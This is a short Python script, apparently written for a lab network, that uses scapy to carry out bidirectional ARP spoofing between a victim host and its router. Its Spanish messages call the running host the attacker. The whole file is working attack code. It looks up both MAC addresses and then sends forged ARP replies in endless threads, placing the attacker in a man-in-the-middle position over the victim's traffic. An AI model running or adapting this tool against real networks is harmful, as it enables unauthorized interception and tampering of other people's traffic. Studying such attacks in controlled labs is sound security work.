#!/usr/bin/env python3

from scapy.all import Ether, ARP, sendp, get_if_hwaddr
import time, sys

IFACE = "br-5abcc0f65712"
IP_VICTIMA  = "10.99.1.10"
IP_ROUTER   = "10.99.1.1"
MAC_ATACANTE = get_if_hwaddr(IFACE)

RED   = "\033[91m"; CYAN = "\033[96m"; RESET = "\033[0m"

def get_mac(ip: str) -> str:
    from scapy.all import srp, Ether, ARP
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=2, iface=IFACE, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    print(f"{RED}[!] No se pudo obtener la MAC de {ip}{RESET}")
    sys.exit(1)

def envenenar(ip_victima: str, mac_victima: str,
              ip_suplantar: str, intervalo: float = 1.5) -> None:
    pkt = (
        Ether(dst=mac_victima) /
        ARP(
            op=2,                   # is-at (reply)
            pdst=ip_victima,        # destinatario del spoofeado
            hwdst=mac_victima,      # MAC del destinatario
            psrc=ip_suplantar,      # IP que estamos suplantando
            hwsrc=MAC_ATACANTE      # nuestra MAC (la del atacante)
        )
    )

    print(f"{CYAN}[>] Diciendole a {ip_victima} ({mac_victima})"
          f" que {ip_suplantar} ->’ {MAC_ATACANTE}{RESET}")

    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        time.sleep(intervalo)

if __name__ == "__main__":
    print(f"\n{RED}[*] Iniciando ARP Spoofing bidireccional...{RESET}\n")
    print(f"    Atacante MAC : {MAC_ATACANTE}")

    mac_victima = get_mac(IP_VICTIMA)
    mac_router  = get_mac(IP_ROUTER)

    print(f"    Victima  MAC : {mac_victima}")
    print(f"    Router   MAC : {mac_router}\n")

    import threading
    t1 = threading.Thread(
        target=envenenar, args=(IP_VICTIMA, mac_victima, IP_ROUTER),
        daemon=True
    )
    t2 = threading.Thread(
        target=envenenar, args=(IP_ROUTER, mac_router, IP_VICTIMA),
        daemon=True
    )
    t1.start()
    t2.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}[*] Ataque detenido.{RESET}")
